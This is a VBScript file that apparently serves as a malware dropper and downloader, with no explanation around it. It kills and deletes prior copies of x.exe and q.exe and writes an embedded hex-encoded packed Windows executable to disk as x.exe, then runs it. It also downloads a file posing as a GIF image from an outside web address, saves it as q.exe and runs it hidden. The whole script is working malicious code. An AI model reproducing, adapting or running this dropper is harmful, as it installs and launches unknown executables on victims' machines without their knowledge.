strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _ 
    ("SELECT * FROM Win32_Process WHERE Name = 'x.exe'")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next
Set colProcessList = objWMIService.ExecQuery _ 
    ("SELECT * FROM Win32_Process WHERE Name = 'q.EXE'")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next
WScript.Sleep(2000)
Set objFileSys = CreateObject("Scripting.FileSystemObject")
IF objFileSys.FileExists("x.exe") Then
        objFileSys.DeleteFile "x.exe"
End IF
Set objFileSys = CreateObject("Scripting.FileSystemObject")
IF objFileSys.FileExists("q.exe") Then
        objFileSys.DeleteFile "q.exe"
End IF
WScript.Sleep(180000)
szBinary = szBinary & "4D5A90000300000004000000504500004C010200465347210000000000000000E0000F010B01000000040000001E000000000000E35C0000001000000C00000000004000001000000002000004000000000000000400000000000000006000000002000000000000020000000000100000100000000010000010000000000000100000000000000000000000A85D00003400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007400000000400000001000000000000000000000000000000000000000000000E00000C000000000746100000010000000500000DC0D000000020000000000000000000000000000E00000C04B45524E454C33322E646C6C0000004C6F61644C69627261727941000047657450726F6341646472657373000000000000000000000000000000000000000000000000009E5D4000925D4000945D4000980140000010400000504000012040000130400000000000D421400001000000D05D4000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000068E001E1C3A8444740E0E850D90A224146080FF4844224C8E5482DBEE6296A224598DE921D2213E87BA81D0F1C0614021B11D7456E140380E8BA2A37502B7A6ACC33055FFF50352BE868A6340BC48F4668B369F443A10AC01350DB3E3D17859474083806FFD0EB247D507E2350A47E509F0C448C42902238388D35303016AC84C00E75FB8A06D87B56E86E0E2C01EBED681A578EC60947F89600558BEC81C4D4FDFFE2C71985D8FE0C2857442102E8BB8C55A3AF978B157D088D1B2850A050AF5BC5E112858633500E50FC19E85256138F57ADC91B01AB751EF4B5E0D83B9B01E8458CE6A5C69C0A0864E2345F685477A834740229EBA61191300EC9C204159F0756575350637508C8DEAC3CE147C4475CB6F71628EBF397770CEAAC6FAA26E0FA585B5F5EC95808001825482040DD0D219024C81064143218191C0DEE19440C2886432C21309034C838643C32081B8432040C0000AF017FE0757365720733322E646C1C0000005F4156504D2E4558E5530A438D5E0BBC014B57494E3332480D637D6B22696E3965784044395658E8391A47476F2154535652500D616765146E7477258F4CED52310D4CF44F47F9BF20520D3E4D9E4E39290B3176492DCC524F684A1210E75621525553590E0C09506E49699FBA29520F9F4C1D436B9A80617076786477A29C1175505A9A0A54434F0AC34755F152444A0CD9F635C7D56025555044DF0AA964BF32578148920C12191A0C0F86BC945733C375746FF872616352657D68372A71569CFF53D44C0DCF47DFE44C5076670A6374726C344D3102854CB01853657572852930C80C4539620D57B0F8766B39706F522D681639EC2F73CA196994230F1877DA6C398E53504478A58B29EEC91402C564706D3056736368F26491F44FC053796E4D676F725327594E94479D26F64A6D88A60C6EB273A539F56D110A2224517CA30CC810C8D8C042445F5090967B46715369497A0838144F6E44EA460ACA0C4AA5ED1C07BF2A0A53CB566A603CC723133E5309264CCBABF109626C02AD6B649AD1291608477E4FB418681B1A474F1928FDB5211A20BE214732BD1E533155300A3863924170667A14FC76497416430D3B500E795376F0C54344277D844681B0495A4D0BE6C13A4DF54E5C0D55FDF5540A3C4E530B959FC0636C65616E90CEFD491A3151311107E6CA0CAA81D37A76351AA029303152360C6D167E2152543BDA31511B18FF635670FC2843EF147739350B9407365716EC842888186366A61AD0E17AA7D55269930E18479F12504614F8212B360D28F48E0D91E14F2A56077A604542317238AC0C5854B841B3100D6465666261CC72749B86481B8761E4677569540F9408CE98651A50827359920B85B452D92CE85046AC08910CCFAD526DFC4F4EAC0DEE429362ACCA1450F1420A895F33E17CCAEF25AB1765E9BABD4291C373DB48425A0DD01AE256145D54BE41A1218FF6BC0F84BFFFA3CA8435088BEB122D4329FCB2084E52900B462D344147423554020F6D6568CE8814464153228566636713A569761DA05045E94C936E3EF8B8A79A4A7C544C4307A0666E7256622A342D37666B178C6B83F9F594D22C0B5FA3C1AA419B51D25790477361E3484553B0B68C126876B214E735C53007A542592A36481144576D0AD90A73676BC553DA6D940A52610B90B1E6A62B4F5081BE17737412FB8C674724424DA21055C4676281276E755616161C706F6C692189504F3A1250AAA26062E64C2894065A290A0E41F50D2E4816A0F3DA0A52473E1E48554C1E89573AD887144D2F741E89690E9E57760F2DB9B64D2F75891C1854E92DCD9081699C0A5D02210D624E543A6AB5190A53A4F89AA10D6824C90B013BB42C1457623402230C4F147539380C8A50CF3F49F2DF3D7EA675EFEA4575144A8D71B3CDBDFEB84589094B20934CB82EFC344830222B4711248C955311A2469BCDD491444F2DB91A8E323133FA3E4530A1183F58EC74683434195C4250B7890999247C43A1EC4D6D61C4660E164C4454120BA61AD0470AA52DEEA61C77A123B786AFF62945931B4B94A13D0D4B29126C6FC70042776EA811CE4947313DF87E41FF590A0D65E543A5E41C71D020BB72A66898BA7A50A9434D97FC472926BF185C1814444C2E9F4063736869656C53642648C04E660D169C2773241A569C210C6FAA48DA210D2AE0D1AE0B95883E330E303244B5C88F4DD21A906C423D160D8643F931AED2B21708AE0948B5A4C2525117EF826F6E69C14972599F159D8490354410DDD2F5D5481201DD1DA61F1F94591B9E6E641E55290B1253C57A847F3764DDE2F3F933321907D23E8A430DC35530D3318CC4F1250DCBCA430B40614EA2CC795824621D723B7F7963A0113830D0E8739A1B6378826EE26F617373D1635931AD260869205157A3DC0D1D44EB0A2A418306E93135440E10B824A4C79BD542640C763BC468771660C4579D0CED433249DA160CE47234A40CB03E8C37FE4F93614FE0656F5761741D63684CD4674B92136C399C1E0D5234460C48FDA61791E62602231ABFFC1E5948552D85A62D822C32BA15CA5D310C55A492D4210D3CF8B98E6C1955524D0A58B94D7FDEB7F8CF7A76320C0EB5AF5FF45A6F8B3A7243A4F4D7719B85023749216E078D732461E695409146C3305F54579DC7736D64E6C394E1324B4947B6321AEDA26C6E31F32D8290448B706A52628119445322B5D0E43C484843A16E74A5CAA8F21A445484C277B7AFE96382AF66694E497975A416F07005677261646525150DFB52923D099B1ADDDCF06E4D762A52CC89571EB6F9EAF129CD1C329F433D7AD048B75851A7D906525022870CA045B22C871322E887163FDA2DEABC167AEE4B865E70125D05D6787959723056936B5867D8D443C95BCC5339D10810C14B5F3736CC31347533AC1226494F18507063E320286D746FAC0DBE000A393727C8E4253B0B2E1A44DF73271A46A71C497D880E10DEF99C3130B9AD37330552AE87CA504772E2CE6BED460E0E7DD18E0BDEBE4677AEC6D4C408F6104A4729B3F54CE55459189798335D53EB0D2914CD180A3049A03C44CC4A9651A512D3686C50D7C11F57E90DBC1442430AD31BE046FC64A36C4336D01378A38E4D1E2A4C522B3015144791394D14554428E411710C908996645A1FA3EBF485555247719A5649FD57377D255166048419FB2C4AE482B6707B36B2D6564CBC82095B1CB219382909B86E8182A18AADFF536818D69CA10C4BCE31D41A323F55D20BD1189FA796EFA2A6626D4EA681D156954A4EABDF52551C94FECA639153DA468FC428426F9DEE475873629ED452A99B731DB2165245A9BE52654830CB5F6D833F1455531BA4C5AB8728DEB6D95920424386F13120254D19551D8909AD65F5365D9A28196C4D4C384F294649092B8CB310485660A07B2C70681C1578B2998C584D15ED332240DAAE1A70099541DA4C590C49EE02F6351A42D709ACEE8DF87771653A704E2974152787562E9759BD1B7586372264224DCDC562DF9E09796D62CC541B5B4B412943A17B8A68E03F244BE2532B18550B944307CA4108644D64C194322D61E80A0C3B4E429ED4330A8246414BBA0933BED047424F93D53D6BEA2E98540CE7AABFCB46FE864DF84A91DA6D19630692F3B46F57F46C920D3944B2CAFB52271CDE5856875B2C13762F62631614EE74FF7360410CA64D27A1311E62EED7147316D7C43B354689D4E6940CD6F46574106293E7C97137480A4843BFDF77D9A90DB31419144B7F692D78C052791829464C6149522D35791D0D01894D4472E04B9592F66587564E9B2907CC14C71A5043CF90A61956320A21344925DF3077E9CA86728B6441D63668DFE625DFFE690BBFDB1684653504326877F886A6325349B1DF6714D7D216293AA55E08232C69C5233516374CBA0D527666210E68E7A10FA68A984498383986FB277F4F25A9F72D5922481F9EAB0D2EC753E247E23FBB79D8484F53AB3514B6474D59DEFCFA5C553DA6E778529684E9EE69F05296385BE372E1646D3E66E03097144DDE2EE7CE45F770A24799714F895941624EDAC0BE4B5393A96E72C29430F3508B5A414E52277A61089145B529354F4AC131256D1C77FF6B1861F95319F26405154D3236279A1EE29A78CAFD5550037165616C91726D3E74C6E8FBA4F876E7C657CE595314DC2D24B420B5A3D6DBC9A11249D99F210F49666DE142016BC34724D26C439D647B707D520D676973742439D096596D0A73C652179D21C8455C4DB32A2673916674EAD4C42F0FFE7E074375721B50AA6F56628A69B23FBF52FCE04DF9312DF879205A435CA12B01C75C056D131FC92B8000011C102040036B65726E986C33323A2E64F6E049FA743C4D6FBF75F7304669084E616DFE41A5131F48DA6E46101150723C6F63FDFDDBF3738D060F5769343E6F773B44E72263DF3D5879485170F46EA2250621452C3F6174BE54FE336C68D0701FD2536EFB3D73FF707452522167244E66781C6F55B8AE700A568E1B6D9C46613E31591C4578B8AE76F8747672CA304109416D70698E14456FCA79A84F544AA61EF5B33E326CFFDAAFEE0E0115E47BF476CAE869E4E05465674FA99F4BDD7994B2410E2853C20F56616C75340FCA433E373D060200BEA4014000AD93AD97AD5696B280A4B680FF1373F933C9FF13731633C0FF13731FB68041B010FF1312C073FA753CAAEBE0FF530802F683D901750EFF5304EB26ACD1E8742F13C9EB1A9148C1E008ACFF53043D007D0000730A80FC05730683F87F77024141958BC5B600568BF72BF0F3A45EEB9D8BD65EAD48740A7902AD50568BF297EB87AD935E46AD9756FF1395AC84C075FBFE0E74F0790546AD50EB09FE0E0F8476B2FFFF5655FF5304ABEBE033C941FF1313C9FF1372F8C302D275058A164612D2C3D05D0000000000000000000054010000D05D00000000000000000000000000000000000000000000610100006F010000000000000000000000" & szZeroLine
szApplication = "x.exe"
Set hFSO = CreateObject("Scripting.FileSystemObject")
Set hFile = hFSO.CreateTextFile(szApplication, ForWriting)
intLength = len(szBinary)
intPosition = 1
while intPosition < intLength
char = Int("&H" & Mid(szBinary, intPosition, 2))
hFile.Write(Chr(char))
intPosition = intPosition+2
wend
hFile.Close
Set hShell=CreateObject("WScript.Shell")
hShell.run(szApplication+" "+szURL)
Dim BD
Dim xml
WScript.Sleep(8000)
Set xml = CreateObject("Microsoft.XMLHTTP")
xml.Open "GET", "http://www.asclepios.at/images/2.gif", False
xml.Send
BD = xml.ResponseBody
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Dim BinaryStream
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
BinaryStream.Open
BinaryStream.Write BD
BinaryStream.SaveToFile "q.exe", adSaveCreateOverWrite
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "q.exe", 0, false
